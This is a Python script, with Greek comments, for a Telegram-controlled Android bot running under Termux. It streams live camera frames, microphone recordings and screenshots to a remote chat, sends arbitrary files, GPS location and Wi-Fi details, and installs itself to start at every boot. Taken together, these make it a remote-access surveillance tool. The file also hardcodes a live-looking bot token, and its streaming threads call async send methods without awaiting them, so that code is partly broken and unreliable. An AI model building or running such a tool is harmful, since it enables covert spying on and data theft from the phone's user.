"""
Phone Control Bot - Telegram bot με live camera, mic, screen streaming.
ΑΠΑΙΤΕΙΤΑΙ:
- Termux + Termux:API app
- pkg install python termux-api ffmpeg
- pip install python-telegram-bot pillow numpy opencv-python-headless scrcpy-client
"""

import subprocess
import logging
import time
import os
import threading
import tempfile
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
import cv2
import numpy as np
from PIL import Image

# ---------- ΡΥΘΜΙΣΕΙΣ ----------
BOT_TOKEN = "8807446302:AAHdsSmScrP5gy_Hwa-CTw3T2fYcCuENINw"
ALLOWED_CHAT_ID = 0  # 8248902261

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global state για live streams
live_camera = False
live_mic = False
live_screen = False
streaming_process = None

def is_authorized(update: Update) -> bool:
    return update.effective_chat.id == ALLOWED_CHAT_ID

def run_cmd(cmd: list, timeout: int = 30) -> str:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() or result.stderr.strip() or "(χωρίς έξοδο)"
    except Exception as e:
        return f"Σφάλμα: {e}"

async def guard(update: Update) -> bool:
    if not is_authorized(update):
        await update.message.reply_text("Δεν έχεις πρόσβαση.")
        return False
    return True

# ---------- LIVE CAMERA ----------
async def cam_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_camera
    if not await guard(update): return
    if live_camera:
        await update.message.reply_text("Η κάμερα ήδη τρέχει.")
        return
    live_camera = True
    await update.message.reply_text("🎥 Live κάμερα ξεκίνησε. Θα λαμβάνεις frame κάθε 5 δευτερόλεπτα.")
    threading.Thread(target=cam_stream, args=(update, context), daemon=True).start()

def cam_stream(update, context):
    global live_camera
    cap = cv2.VideoCapture(0)
    while live_camera:
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            try:
                context.bot.send_photo(chat_id=ALLOWED_CHAT_ID, photo=buf.tobytes())
            except:
                pass
        time.sleep(5)
    cap.release()

async def cam_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_camera
    if not await guard(update): return
    live_camera = False
    await update.message.reply_text("📷 Κάμερα σταμάτησε.")

# ---------- LIVE MIC ----------
async def mic_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_mic
    if not await guard(update): return
    if live_mic:
        await update.message.reply_text("Το μικρόφωνο ήδη τρέχει.")
        return
    live_mic = True
    await update.message.reply_text("🎙️ Live μικρόφωνο ξεκίνησε. Θα λαμβάνεις ηχητικό clip κάθε 15 δευτερόλεπτα.")
    threading.Thread(target=mic_stream, args=(update, context), daemon=True).start()

def mic_stream(update, context):
    global live_mic
    while live_mic:
        audio_path = "/data/data/com.termux/files/home/audio.wav"
        run_cmd(["termux-microphone-record", "-d", "10", "-f", audio_path])
        try:
            with open(audio_path, "rb") as f:
                context.bot.send_audio(chat_id=ALLOWED_CHAT_ID, audio=InputFile(f))
        except:
            pass
        time.sleep(15)

async def mic_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_mic
    if not await guard(update): return
    live_mic = False
    run_cmd(["termux-microphone-record", "-q"])
    await update.message.reply_text("🔇 Μικρόφωνο σταμάτησε.")

# ---------- LIVE SCREEN ----------
async def screen_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_screen
    if not await guard(update): return
    if live_screen:
        await update.message.reply_text("Η οθόνη ήδη τρέχει.")
        return
    live_screen = True
    await update.message.reply_text("🖥️ Live screen capture ξεκίνησε. Θα λαμβάνεις screenshot κάθε 5 δευτερόλεπτα.")
    threading.Thread(target=screen_stream, args=(update, context), daemon=True).start()

def screen_stream(update, context):
    global live_screen
    # Χρήση scrcpy για screen capture
    while live_screen:
        # Εναλλακτικά: χρησιμοποιούμε screencap μέσω adb
        img_path = "/data/data/com.termux/files/home/screen.jpg"
        run_cmd(["screencap", "-p", img_path])
        try:
            with open(img_path, "rb") as f:
                context.bot.send_photo(chat_id=ALLOWED_CHAT_ID, photo=InputFile(f))
        except:
            pass
        time.sleep(5)

async def screen_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_screen
    if not await guard(update): return
    live_screen = False
    await update.message.reply_text("🖥️ Screen capture σταμάτησε.")

# ---------- ΒΑΣΙΚΕΣ ΕΝΤΟΛΕΣ ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    await update.message.reply_text("Bot έτοιμο. /help για λίστα.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    text = (
        "📱 ΕΝΤΟΛΕΣ:\n\n"
        "📸 Κάμερα:\n"
        "/cam_start - Live κάμερα (κάθε 5\")\n"
        "/cam_stop - Σταμάτα κάμερα\n\n"
        "🎙️ Μικρόφωνο:\n"
        "/mic_start - Live μικρόφωνο (κάθε 15\")\n"
        "/mic_stop - Σταμάτα μικρόφωνο\n\n"
        "🖥️ Οθόνη:\n"
        "/screen_start - Live screen capture\n"
        "/screen_stop - Σταμάτα capture\n\n"
        "📁 Αρχεία:\n"
        "/files [φάκελος] - Λίστα αρχείων\n"
        "/getfile <path> - Λήψη αρχείου\n\n"
        "🔧 Άλλα:\n"
        "/battery - Μπαταρία\n"
        "/location - GPS\n"
        "/wifi - Wi-Fi info\n"
        "/torch on|off - Φακός\n"
        "/notify <κείμενο> - Ειδοποίηση\n"
        "/tts <κείμενο> - Text-to-speech\n"
        "/vibrate - Δόνηση\n"
        "/open <package> - Άνοιγμα εφαρμογής"
    )
    await update.message.reply_text(text)

async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    path = "/data/data/com.termux/files/home/photo.jpg"
    await update.message.reply_text("📸 Λήψη φωτογραφίας...")
    run_cmd(["termux-camera-photo", "-c", "0", path])
    try:
        with open(path, "rb") as f:
            await update.message.reply_photo(f)
    except:
        await update.message.reply_text("Αποτυχία.")

async def battery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    await update.message.reply_text(run_cmd(["termux-battery-status"]))

async def files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    folder = context.args[0] if context.args else "/sdcard"
    await update.message.reply_text(run_cmd(["ls", "-la", folder])[:4000])

async def getfile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    if not context.args:
        await update.message.reply_text("Χρήση: /getfile /sdcard/όνομα")
        return
    try:
        with open(context.args[0], "rb") as f:
            await update.message.reply_document(f)
    except Exception as e:
        await update.message.reply_text(f"Σφάλμα: {e}")

async def location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    await update.message.reply_text("📍 Λήψη τοποθεσίας...")
    await update.message.reply_text(run_cmd(["termux-location"], timeout=30))

async def wifi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    await update.message.reply_text(run_cmd(["termux-wifi-connectioninfo"]))

async def torch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    if not context.args or context.args[0] not in ("on", "off"):
        await update.message.reply_text("Χρήση: /torch on/off")
        return
    run_cmd(["termux-torch", context.args[0]])
    await update.message.reply_text(f"Φακός: {context.args[0]}")

async def notify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    text = " ".join(context.args) or "Ειδοποίηση"
    run_cmd(["termux-notification", "--content", text])
    await update.message.reply_text("✅ Ειδοποίηση στάλθηκε.")

async def tts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    text = " ".join(context.args)
    if not text:
        await update.message.reply_text("Χρήση: /tts κείμενο")
        return
    run_cmd(["termux-tts-speak", text])
    await update.message.reply_text("🔊 Αναπαράχθηκε.")

async def vibrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    run_cmd(["termux-vibrate", "-d", "500"])
    await update.message.reply_text("📳 Δόνηση.")

async def open_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await guard(update): return
    if not context.args:
        await update.message.reply_text("Χρήση: /open com.whatsapp")
        return
    run_cmd(["am", "start", "-n", f"{context.args[0]}/.MainActivity"])
    await update.message.reply_text(f"✅ Άνοιξε: {context.args[0]}")

# ---------- PERSISTENCE (AUTOSTART) ----------
def setup_autostart():
    boot_dir = "/data/data/com.termux/files/home/.termux/boot"
    os.makedirs(boot_dir, exist_ok=True)
    script_path = f"{boot_dir}/bot_start.sh"
    with open(script_path, "w") as f:
        f.write("#!/data/data/com.termux/files/usr/bin/bash\n")
        f.write("cd ~\n")
        f.write("python3 bot.py &\n")
    os.chmod(script_path, 0o755)
    print("✅ Autostart enabled. Το bot θα τρέχει αυτόματα στο boot.")

# ---------- MAIN ----------
def main():
    if BOT_TOKEN == "ΒΑΛΕ_ΕΔΩ_ΤΟ_TOKEN_ΣΟΥ" or ALLOWED_CHAT_ID == 0:
        print("❌ Βάλε το BOT_TOKEN και το ALLOWED_CHAT_ID πρώτα.")
        return

    # Ενεργοποίηση autostart
    setup_autostart()

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("photo", photo))
    app.add_handler(CommandHandler("battery", battery))
    app.add_handler(CommandHandler("files", files))
    app.add_handler(CommandHandler("getfile", getfile))
    app.add_handler(CommandHandler("location", location))
    app.add_handler(CommandHandler("wifi", wifi))
    app.add_handler(CommandHandler("torch", torch))
    app.add_handler(CommandHandler("notify", notify))
    app.add_handler(CommandHandler("tts", tts))
    app.add_handler(CommandHandler("vibrate", vibrate))
    app.add_handler(CommandHandler("open", open_app))
    app.add_handler(CommandHandler("cam_start", cam_start))
    app.add_handler(CommandHandler("cam_stop", cam_stop))
    app.add_handler(CommandHandler("mic_start", mic_start))
    app.add_handler(CommandHandler("mic_stop", mic_stop))
    app.add_handler(CommandHandler("screen_start", screen_start))
    app.add_handler(CommandHandler("screen_stop", screen_stop))

    print("✅ Bot ξεκίνησε με live streams και autostart.")
    app.run_polling()

if __name__ == "__main__":
    main()